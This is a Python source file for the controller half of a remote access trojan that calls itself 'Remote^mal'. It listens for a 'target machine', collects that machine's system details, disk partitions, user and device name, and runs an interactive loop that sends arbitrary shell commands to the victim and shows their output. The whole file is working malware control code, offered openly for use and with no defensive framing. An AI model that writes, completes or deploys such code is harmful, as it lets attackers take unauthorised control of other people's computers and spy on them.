import socket
import os
import sys
from Load import *
import time

class RemoteServer(object):
    
    def __init__(self,Ip,PortId,CharSet="utf-16",Buffering=1024):
       self.Ip=Ip                   #Ipv4 Address Where  The Socket Server Need To Run
       self.PortId=PortId           #Port ID of the Socket Server Need To Run
       self.Address=(Ip,PortId)     #Address Where The Socket Sever Need To Run
       self.CharSet=CharSet         #Character Set For Encoding And Decoding
       self.Buffering=Buffering     #Buffering For Data Transmission (Increase Buffering Consume More Memory And High Speed Of Data Transmission via)
    
    def BindServer(self):
        #Bind the serevr at the specified port
        self.server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server_socket.bind(self.Address)
        self.server_socket.listen()
        print("\n\n\x1b[0;31m <!WAITING FOR THE TARGET>...\x1b[0m")
        self.client_socket,self.client_address=self.server_socket.accept()
        print(f"\x1b[0;31mConnected To The Target Machine >>>\x1b[0m \x1b[38;5;208m<{self.client_address[0]}>Ip <{self.client_address[1]}>PortID\x1b[0m\n\n")
        return None

    def Banner(self):
        #Loads The Command Line Banner For The Tool
        print("\x1b[33m_\x1b[0m"*150)
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print(Design.logo(text="<<<Remote^mal>>>",color="red"))
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print("\x1b[33m_\x1b[0m"*150)
        return None

    def send(self,data):
        #Send data as chunks 
        for i in range(0,len(data),self.Buffering):
            chunk =data[i:i+self.Buffering]
            if chunk=="EOF":
                self.client_socket.send(chunk.lower().encode(self.CharSet))
            else:
                self.client_socket.send(chunk.encode(self.CharSet))
        
        #Delay before sending data end
        time.sleep(3)
        self.client_socket.send("EOF".encode(self.CharSet))
        time.sleep(3)
        #Delay after sending data end
        return None

    def recv(self):
        #recieve data as chunks
        data=""
        while True:
            chunk=self.client_socket.recv(self.Buffering).decode(self.CharSet)
            if chunk=="EOF":            #check for the <EndOfFile> to determine data end
                break
            else:
                data+=chunk
        return data

    def GetBuffer(self,flag=False):
        while(flag):
            try:
                #Change the default Buffer Size
                Buffer=input("\x1b[32m>>>Enter the Buffering Amount:\x1b[0m")
                #validating the Buffer Size
                assert (int(Buffer)<=999999999 and int(Buffer)>=1024),"\n\n \x1b[0;31m<Error>: [!]Buffer Size Cannot Be Accepted,It Should Range Between (1024 to 999999999)\x1b[0m\n\n"
                return Buffer
            except AssertionError as e:
                print(e)
        return str(self.Buffering)
    
    def SetBuffer(self):
        #Set Buffering Both Server and client Side
        try:
            if sys.argv[1]=='-b':
                Buffer=self.GetBuffer(flag=True)
            else:
                Buffer=self.GetBuffer()
        except IndexError:
                Buffer=self.GetBuffer()
        print(f"\n\x1b[32m[+]Sockets Are  Buffered with {Buffer}b For Data Transmission\x1b[0m\n")
        self.send(Buffer)
        #Change The Value Of Buffering
        self.Buffering=int(Buffer)
        return None

    def LocationOfFile(self):
        #Get The  Location of the <client>  File Downloaded Path
        self.path=self.recv()
        self.current_path=self.path
        return None

    def Partitions(self):
        #recieve the partitions and mountpoints of the client
        self.partitions=self.recv()
        self.mountpoints=self.recv()

    def PartitionsInfo(self):
        #recieve  the Partitions information such as Name,Mountpoint,(Fixed,Removed),MemorySize
        self.partitions_info=self.recv()

    def PartitionTable(self):
        #Display the partition table of the client
        table_data=[["Partition","MountPoint","Type","Memory(GB)"]]
        for data in PathLib.remover(self.partitions_info.splitlines()):
            table_data.append(data.split("\t"))
        
        return table_data


    def SysPlatform(self):
        #Configure the System platform of the client
        #Windows - win32 , Linux -linux ,Mac -darwin
        self.platform=self.recv()
        return None
        
    def SysInfo(self):
        #Receive the system information of the client
        keys=[]
        values=[]
        Info=self.recv()
        for line in Info.splitlines():
            for data in line.split("<,>"):
                key,value=data.split("<:>")
                keys.append(key)
                values.append(value)
        table_data=[keys,values]
        return table_data

    def GetUserAndDevice(self):

        #Recieve the User and device name for current logged user
        self.user=self.recv()
        self.device=self.recv()
        return None


    def DisplaySysInfo(self,table_data):

        #Dispaly the tabular information of client system
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print(Design.logo(text=">"+self.platform,color="green"))
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print()
        print("\x1b[32m[^]System Information\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print("\x1b[0;31m"+Design.MakeTable(table_data,Design.findwidth(table_data)).draw()+"\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()
       
    def DisplayPartitionInfo(self,table_data):

        #Dispaly the tabular information of client Partiton
        print(f"\x1b[33m<Warning>: If the Memory is (-1) the file system is not valid for the {self.platform}\x1b[0m")
        print()
        print("\x1b[32m[^]Partition Information\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print("\x1b[0;31m"+Design.MakeTable(table_data,Design.findwidth(table_data)).draw()+"\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()

    def TrackPartition(self,previous_data,current_data):
        #track the partitions newly added  and removed
        
        added=list(item for item in current_data if item not in previous_data)
        removed=list(item for item in previous_data if item not in current_data)

        for item in added:
            print()
            print(f"\x1b[32m<[+] PARTITION ADDED> {tuple(item)}\x1b[0m")
            print()
            self.table_data.append(item)

        for item in removed:
            print()
            print(f"\x1b[0;31m<[-] PARTITION REMOVED> {tuple(item)}\x1b[0m")
            print()
            self.table_data.remove(item)
       
        

    def WinPathConfig(self,cmd):

        #Coping current path location
        self.current_path=self.path
        cmd=PathLib.JoinPath(PathLib.RemoveDot(PathLib.remover(PathLib.splitdirectory(cmd[3:len(cmd)]))))
        #Path configuration for directory navigation
        #Relative path navigation
        
        if (not PathLib.isabsolute(cmd) and PathLib.CountDirectories(cmd)>=1):
            self.path+="\\"+cmd

        #Absolute path navigation
        elif (PathLib.isabsolute(cmd)):
            
            if(PathLib.CountDirectories(cmd)>=1):
                self.path=cmd
            else:
                if cmd[-1]=="\\":
                    self.path=cmd
                else:
                    self.path=cmd+"\\"

        self.path=PathLib.replacer(self.path)
        self.path=PathLib.JoinPath(PathLib.RemoveDot(PathLib.remover(PathLib.splitdirectory(self.path))))
        self.send(self.path)

    def WinBackDir(self,cmd):
        #return to the parent directory
        cmd=PathLib.JoinPath(PathLib.BackDotRemover(PathLib.remover(PathLib.splitdirectory(cmd[3:len(cmd)]))))
        self.current_path=self.path
        drive,cwd=PathLib.DriveAPath(self.path)        #return the path and drive in the absolute path
        self.path=PathLib.BackDir(drive,cwd,cmd)
        self.send(self.path)
        
    def UnixPathConfig(self,cmd):

        #Coping current path location
        self.current_path=self.path
        #Path configuration for directory navigation for Unix Systems
        #Relative path navigation
        if (not UnixPathLib.isabsolute(cmd[3:len(cmd)],self.user)):
            cmd=UnixPathLib.JoinrootPath(UnixPathLib.remover(UnixPathLib.splitdirectory(cmd[3:len(cmd)])))
            self.path+="/"+cmd

        #Absolute path navigation
        elif(UnixPathLib.isabsolute(cmd[3:len(cmd)],self.user)):
            cmd=UnixPathLib.JoinrootPath(UnixPathLib.remover(UnixPathLib.splitdirectory(cmd[3:len(cmd)])))
            self.path=cmd


        self.path=UnixPathLib.ReverseReplacer(self.path,self.user)
        self.send(self.path)

    def UnixBackDir(self,cmd):
        #Used to return to Parent Directory Navigation.
        self.current_path=self.path
        self.path=UnixPathLib.BackDir(self.user,UnixPathLib.ReverseReplacer(self.path,self.user),UnixPathLib.ReverseReplacer(cmd[3:len(cmd)],self.user))
        self.send(self.path)


    def VerifyPath(self):
        #Verify whether the path is client's path
        flag=self.recv()
        if (flag=="TRUE"):
            pass
        else:
            self.path=self.current_path 
            

    def Getstdin(self):
        #(Stdin) Reciever for the subprocess created by client
        #Recieve the input for the command executed
        while(True):
            #Recieve the flag to indicate the client wheather input is comming or not
            flag=input("\x1b[33m(Does the above command requires any input[Y or N])\x1b[0m?") 

            if(flag.upper()=="Y"): #check the flag is Y for Yes
                self.send(flag)
                stdin=input("\x1b[33m<Input>$\x1b[0m")
                self.send(stdin)
                break

            elif(flag.upper()=="N"): #check the flag is N for no
                self.send(flag)
                break

            else:
                print("\x1b[0;31mWrong input:(Y or N)\x1b[0m") #Any other input considered as wrong
                
    

    def close(self):
        #close the socket connection.
        print(f"\x1b[0;31mTarget Connection Disconnected:\x1b[0m\n\x1b[0;34m1)Ip:{self.Ip}\n2)PortId:{self.PortId}\n3)UserName:{self.user}\n4)DeviceName:{self.device}\x1b[0m")                   #Message Indicate Closing Connection.
        self.server_socket.close()
        sys.exit(0)     #Exit the Program with Success Code 0. 
        return None


    def main(self):
        #Entry Point of the Program ,Remote Command Execution Start Point:)

        if(self.platform=="win32"):

            #The code Block of windows command execution
            while(True):
                #Tracking newly added and removed partitions

                self.PartitionsInfo()
                new_data=self.PartitionTable()
                self.TrackPartition(self.table_data,new_data)

                #Recieve the command to be executed in Target machine
                cmd=input(f"\x1b[0;34m{self.path}>\x1b[0m")
                self.send(cmd)  #send the command to the client

                if((cmd.split()[0]=="cd") and (len(cmd.split())>=2 )):
                    
                    #<WINDOWS>Parent Directory Navigation
                    if(PathLib.isBack(cmd[3:len(cmd)])):
                        self.WinBackDir(cmd)
                        self.VerifyPath()

                    #<WINDOWS>Child Directory Navigation
                    else:
                        self.WinPathConfig(cmd)
                        self.VerifyPath()

                elif(cmd.lower()=="remotequit"):
                    self.close() #Close the socket connection.


                else:
                    #Recieve the output for the command execution
                    self.Getstdin()
                    stdout=self.recv()
                    print(f"\n\n\n\x1b[0;32m{stdout}\x1b[0m\n\n\n")
             



        elif(self.platform=="linux" or self.platform=="darwin"):

            #The code Block of linux or Mac command execution
            while(True):
                #Tracking newly added and removed partition

                self.PartitionsInfo()
                new_data=self.PartitionTable()
                self.TrackPartition(self.table_data,new_data)

                #Recieve the command to be executed in Target machine
                cmd=input(f"\n\n\x1b[0;32m{self.user}@{self.device}\x1b[0m:\x1b[0;34m{UnixPathLib.replacer(self.path,self.user)}\x1b[0m$")
                self.send(cmd) #send the command to the client

                #Check wheather the contains cd (change directory) for directory navigation
                if((cmd.split()[0]=="cd") and (len(cmd.split())>=2 )):

                    #<UNIX>Parent Directory Navigation
                    if(UnixPathLib.isBack(cmd[3:len(cmd)])):
                        self.UnixBackDir(cmd)
                        self.VerifyPath()

                    #<UNIX>Child Directory Navigation  
                    else:
                        self.UnixPathConfig(cmd)
                        self.VerifyPath()


                elif(cmd.lower()=="remotequit"):
                    self.close() #Close the socket connection.


                else:

                    #Recieve the output for the command execution
                    self.Getstdin()
                    stdout=self.recv()
                    print(f"\n\n\n\x1b[0;32m{stdout}\x1b[0m\n\n\n")
                    


        else:

            #RemoteMal Can only work on (Windows,linux,mac) Any other platform will not be Accepted
            print(f"Invalid Operating System {self.platform}") #Message indicates client is running in invalid operating system
            self.close() #close the connection




if __name__=="__main__":
    r=RemoteServer("127.0.0.1",6578)
    r.Banner()
    r.BindServer()
    r.SetBuffer()
    r.Partitions()
    r.LocationOfFile()
    r.SysPlatform()
    r.DisplaySysInfo(r.SysInfo())
    r.PartitionsInfo()
    r.table_data=r.PartitionTable()
    r.DisplayPartitionInfo(r.table_data)
    r.GetUserAndDevice()
    r.main()

#######################################################################################################################################
    
    
    


   
    
